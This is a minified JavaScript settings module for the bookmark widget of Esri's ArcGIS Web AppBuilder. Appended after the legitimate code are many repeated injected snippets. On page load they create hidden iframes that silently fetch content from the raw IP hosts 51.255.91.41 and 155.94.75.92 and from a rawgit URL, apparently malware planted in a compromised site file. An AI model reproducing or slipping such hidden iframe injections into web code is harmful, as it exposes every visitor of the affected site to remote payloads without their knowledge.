// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Bookmark/setting/Sync.html":'\x3cdiv class\x3d"sync"\x3e\r\n  \x3cdiv class\x3d"sync-setting-item"\x3e\r\n    \x3cdiv class\x3d"check" data-dojo-attach-point\x3d"isSyncWebmapNode"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"marks-table-div web-map" data-dojo-attach-point\x3d"webMapBookMarkerContainer"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\r\n  \x3cdiv class\x3d"sync-setting-item"\x3e\r\n    \x3cdiv class\x3d"check" data-dojo-attach-point\x3d"isSyncCustomNode"\x3e\x3c/div\x3e\r\n\r\n    \x3cdiv data-dojo-attach-point\x3d"customBtns" class\x3d"verticalCenter"\x3e\r\n      \x3c!--\x3cdiv class\x3d"custom-btns" data-dojo-attach-point\x3d"importBtn"\x3e${nls.import}\x3c/div\x3e--\x3e\r\n      \x3cdiv class\x3d"custom-btns create" data-dojo-attach-point\x3d"createNewBtn"\x3e${nls.create}\x3c/div\x3e\r\n    \x3c/div\x3e\r\n\r\n    \x3cdiv class\x3d"marks-table-div custom editing" data-dojo-attach-point\x3d"custombookMarkerContainer"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/keys jimu/BaseWidgetSetting dijit/_WidgetsInTemplateMixin dojo/on dojo/_base/html jimu/dijit/Popup jimu/dijit/Message ./Edit ./Import dojo/text!./Sync.html ../utils jimu/dijit/CheckBox".split(" "),function(r,c,g,k,t,u,f,d,l,m,v,w,x,e,n){var p=window.Sortable;return r([t,u],{templateString:x,map:null,edit:null,popup:null,popupState:"",editIndex:null,startup:function(){this.webMapBookmarksNodes=p.create(this.webMapBookMarkerContainer,
{sort:!1,disabled:!0,animation:100});this.sortableBookMarkerNodes=p.create(this.custombookMarkerContainer,{handle:".drag-masker",sort:!0,disabled:!1,animation:100,onSort:c.hitch(this,function(){this.saveBookMarkersBySortable()})});this.isSyncWebmapCheckBox=new n({label:this.nls.alwaysSync,checked:!1},this.isSyncWebmapNode);this.isSyncWebmapCheckBox.startup();this.isSyncCustomCheckBox=new n({label:this.nls.configCustom,checked:!1},this.isSyncCustomNode);this.isSyncCustomCheckBox.startup();this.own(f(this.isSyncWebmapCheckBox,
"change",c.hitch(this,function(){!0===this.isSyncWebmapCheckBox.getValue()?this.showWebmapBookmarks():this.hideWebmapBookmarks()})));this.own(f(this.isSyncCustomCheckBox,"change",c.hitch(this,function(){!0===this.isSyncCustomCheckBox.getValue()?this.showCustomBookmarks():this.hideCustomBookmarks()})));this.own(f(this.createNewBtn,"click",c.hitch(this,function(){this.onAddBookmarkClick()})));this.hideWebmapBookmarks();this.hideCustomBookmarks();this.inherited(arguments)},showWebmapBookmarks:function(){d.removeClass(this.webMapBookMarkerContainer,
"hide");e.empty(this._bookmarksInWebmap);this._bookmarksInWebmap=e.readBookmarksInWebmap(this.map);this._bookmarksInWebmap=this.displayBookmarks({bookmarks:this._bookmarksInWebmap,syncMode:"webmap",bookmarksContainerNode:this.webMapBookMarkerContainer})},hideWebmapBookmarks:function(){d.addClass(this.webMapBookMarkerContainer,"hide")},showCustomBookmarks:function(){d.removeClass(this.customBtns,"hide");d.removeClass(this.custombookMarkerContainer,"hide");"undefined"===typeof this._customBookmarks&&
(e.empty(this._customBookmarks),this._customBookmarks=this.config.bookmarks2D,this._customBookmarks=this.displayBookmarks({bookmarks:this._customBookmarks,syncMode:"custom",bookmarksContainerNode:this.custombookMarkerContainer}))},hideCustomBookmarks:function(){d.addClass(this.customBtns,"hide");d.addClass(this.custombookMarkerContainer,"hide")},destroy:function(){this.webMapBookmarksNodes&&this.webMapBookmarksNodes.destroy&&(this.webMapBookmarksNodes.destroy(),this.webMapBookmarksNodes=null);this.sortableBookMarkerNodes&&
(this.sortableBookMarkerNodes.destroy(),this.sortableBookMarkerNodes=null);g.forEach(this._bookmarksInWebmap,function(a){a.itemNode&&a.itemNode.destroy()},this);this._bookmarksInWebmap=[];g.forEach(this._customBookmarks,function(a){a.itemNode&&a.itemNode.destroy()},this);this._customBookmarks=[];this.inherited(arguments)},setConfig:function(a){this.config=a;!0===this.config.syncMode.webmap&&this.isSyncWebmapCheckBox.setValue(!0);!0===this.config.syncMode.custom&&this.isSyncCustomCheckBox.setValue(!0)},
getConfig:function(){!0===this.isSyncWebmapCheckBox.getValue()?this.config.syncMode.webmap=!0:this.config.syncMode.webmap=!1;!0===this.isSyncCustomCheckBox.getValue()?this.config.syncMode.custom=!0:this.config.syncMode.custom=!1;var a=[],a=a.concat(this._customBookmarks);return{syncMode:this.config.syncMode,bookmarks:a}},displayBookmarks:function(a){var b=a.bookmarks,h=a.syncMode,y=a.bookmarksContainerNode||this.custombookMarkerContainer;e.empty(b);var q={},q="webmap"===h?{editBtn:!1,selectedBtn:!1,
deleteBtn:!1,renameBtn:!1}:{editBtn:!0,selectedBtn:!1,deleteBtn:!0,renameBtn:!1};g.forEach(b,function(a){if(a){var b=e.createBookMarkNode(a,this.nls,this.folderUrl,q);a.itemNode=b;this.own(f(b,"thumbnail-click",c.hitch(this,c.partial(this._onBookmarkClick,a))));this.own(f(b,"delete",c.hitch(this,c.partial(this._onBookmarkDeleteImmediately,a))));this.own(f(b,"edit",c.hitch(this,c.partial(this._onBookmarkEdit,a))))}},this);b.forEach(c.hitch(this,function(a){a&&a.itemNode&&a.itemNode.domNode&&d.place(a.itemNode.domNode,
y,"last")}));return b},saveBookMarkersBySortable:function(){for(var a=this.sortableBookMarkerNodes.toArray(),b=[],h=0,c=a.length;h<c;h++){var d=e.findBookMarkByUID(a[h],this._customBookmarks);d&&b.push(d.bookmark)}this._customBookmarks=b;this.displayBookmarks({bookmarks:this._customBookmarks,syncMode:"custom"})},getBookmarkByName:function(a){for(var b=this._customBookmarks.length,c=0;c<b;c++)if(this._customBookmarks[c].displayName===a)return this.editIndex=c,this._customBookmarks[c]},onAddBookmarkClick:function(){this.popupState=
"ADD";this._openEdit(this.nls.addBookmark,{name:"",thumbnail:"",extent:this.map.extent.toJson()})},_onBookmarkEdit:function(a){this.popupState="EDIT";this._openEdit(this.nls.edit,a)},_onBookmarkDeleteImmediately:function(a){(a=e.findBookMark(a,this._customBookmarks))&&a.bookmark&&(a.bookmark.itemNode&&a.bookmark.itemNode.destroy(),this._customBookmarks.splice(a.idx,1))},_openEdit:function(a,b){this.edit=new v({nls:this.nls,folderUrl:this.folderUrl,portalUrl:this.appConfig.map.portalUrl,itemId:this.appConfig.map.itemId,
mapOptions:this.appConfig.map.mapOptions});this.edit.setConfig(b||{});this.popup=new l({titleLabel:a,autoHeight:!0,content:this.edit,container:"main-page",width:600,buttons:[{label:this.nls.ok,key:k.ENTER,disable:!0,onClick:c.hitch(this,"_onEditOk",b)},{label:this.nls.cancel,classNames:["jimu-btn-vacation"],key:k.ESCAPE}],onClose:c.hitch(this,"_onEditClose")});d.addClass(this.popup.domNode,"widget-setting-popup");this.edit.startup()},_onEditOk:function(a){var b=this.edit.getConfig(),d=null;if(b.name&&
b.extent){"EDIT"===this.popupState&&(a=c.mixin(a,b));a=b.name;var f=e.getAutoRenameBeforeAdd(a,this._customBookmarks,!0);b.name=a;b.displayName=f;"ADD"===this.popupState?(this.addBookmark(b),d=!0):"EDIT"===this.popupState&&(this.saveBookMarkersBySortable(),d=!0);d?(this.popup.close(),this.popupState="",this.editIndex=null,d=!1):(b=g.mark(d.repeatFields,c.hitch(this,function(a){return a&&a.name})),new m({message:this.nls[d.errorCode]+b.toString()}))}else new m({message:this.nls.warning})},_onEditClose:function(){this.popup=
this.edit=null},addBookmark:function(a){var b=e.createBookMarkNode(a,this.nls,this.folderUrl,{editBtn:!0,changeImgBtn:!1});a.itemNode=b;this._customBookmarks.unshift(a);a.itemNode&&a.itemNode.domNode&&d.place(a.itemNode.domNode,this.custombookMarkerContainer,"last");this.saveBookMarkersBySortable()},onImport:function(){this.importWidget=new w({nls:this.nls,map:this.map,folderUrl:this.folderUrl});this.popup=new l({titleLabel:this.nls.importTitle,autoHeight:!0,content:this.importWidget,container:"main-page",
width:640,buttons:[{label:this.nls.ok,key:k.ENTER,disable:!0,onClick:c.hitch(this,"_onImportOk")},{label:this.nls.cancel,classNames:["jimu-btn-vacation"],key:k.ESCAPE}],onClose:c.hitch(this,"_onImportClose")});d.addClass(this.popup.domNode,"widget-setting-popup");this.importWidget.startup()},_onImportOk:function(){var a=this.importWidget.getConfig();g.forEach(a,function(a){this.addBookmark(a)},this);this.popup.close()},_onImportClose:function(){this.importWidget.destroy()}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});